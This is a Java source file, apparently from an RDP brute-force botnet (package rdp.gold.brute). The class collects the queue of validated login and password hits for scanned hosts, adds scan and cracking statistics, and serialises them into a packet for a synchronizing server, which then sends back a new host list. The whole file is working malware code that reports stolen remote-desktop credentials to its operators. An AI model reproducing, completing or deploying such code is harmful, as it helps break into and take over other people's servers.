package rdp.gold.brute.synchronizer.packages.write;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;

import com.alibaba.fastjson.JSON;

import rdp.gold.brute.CheckerBrute;
import rdp.gold.brute.Config;
import rdp.gold.brute.CounterPool;
import rdp.gold.brute.pool.GoldBrute;
import rdp.gold.brute.synchronizer.SynchronizerInfo;
import rdp.gold.brute.synchronizer.packages.AbstractPackage;

public class BruteResultsPackage extends AbstractPackage implements rdp.gold.brute.synchronizer.packages.WritePackage {
    private final Logger logger = Logger.getLogger(getClass());

    public BruteResultsPackage(SynchronizerInfo synchronizerInfoObject) {
        super(synchronizerInfoObject, "BruteResultsPackage");
    }

    @SuppressWarnings({ "unchecked", "rawtypes" })
    public java.nio.ByteBuffer getPackage() throws Exception {
        Map<String, Object> bruteResults = new java.util.HashMap();
        bruteResults.put("IS_VALID_SERVER_SCAN", Boolean.valueOf(Config.IS_VALID_SERVER_SCAN.get()));
        bruteResults.put("IS_VALID_SERVER_BRUTE", Boolean.valueOf(Config.IS_VALID_SERVER_BRUTE.get()));
        bruteResults.put("IS_LOAD_IP_LOGIN_PASSWORD_LIST", Boolean.valueOf(rdp.gold.brute.Registry.IS_LOAD_IP_LOGIN_PASSWORD_LIST));

        List<String> listValid = new java.util.ArrayList();
        String validEntity;
        while ((validEntity = (String) rdp.gold.brute.ResultStorage.getValidQueue().poll()) != null) {
            listValid.add(validEntity);
        }

        bruteResults.put("VALID_LIST", listValid);

        StringBuilder stringBuilder = new StringBuilder();

        if (Config.TYPE_TASK.get() == 1) {
            stringBuilder.append(CounterPool.pool.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.poolUsed.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.scannedPorts.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.scannedIps.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.countX224RDP.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.countCredSSPRDP.get());
            stringBuilder.append(";");
            stringBuilder.append(GoldBrute.getTaskScanQueue().size());
            stringBuilder.append(";");
            stringBuilder.append(Config.SCAN_THREADS);
            stringBuilder.append(";");
            stringBuilder.append(CheckerBrute.getRdpCount().get());
        } else if (Config.TYPE_TASK.get() == 2) {
            stringBuilder.append(CounterPool.pool.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.poolUsed.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.notSupportedRdp.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.useBytes.get());
            stringBuilder.append(";");
            stringBuilder.append(Config.BRUTE_THREADS);
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.countNotValidRdp.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.countCheckedCombinations.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.countCheckedIp.get());
            stringBuilder.append(";");
            stringBuilder.append(CounterPool.countValid.get());
            stringBuilder.append(";");
            stringBuilder.append(GoldBrute.getTaskBruteQueue().size());
            stringBuilder.append(";");
            stringBuilder.append(CheckerBrute.getRdpCount().get());
            stringBuilder.append(";");
            stringBuilder.append(CheckerBrute.getBrutableCount().get());
        }

        bruteResults.put("STATS", stringBuilder.toString());

        this.logger.info("bruteResults: " + JSON.toJSONString(bruteResults));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

        objectOutputStream.writeObject(bruteResults);
        objectOutputStream.flush();

        return createPacket(byteArrayOutputStream.toByteArray());
    }

    public Class<?> getAwaitPackage() {
        return rdp.gold.brute.synchronizer.packages.read.HostListPackage.class;
    }

    public Class<?> getWritePackage() {
        return null;
    }
}
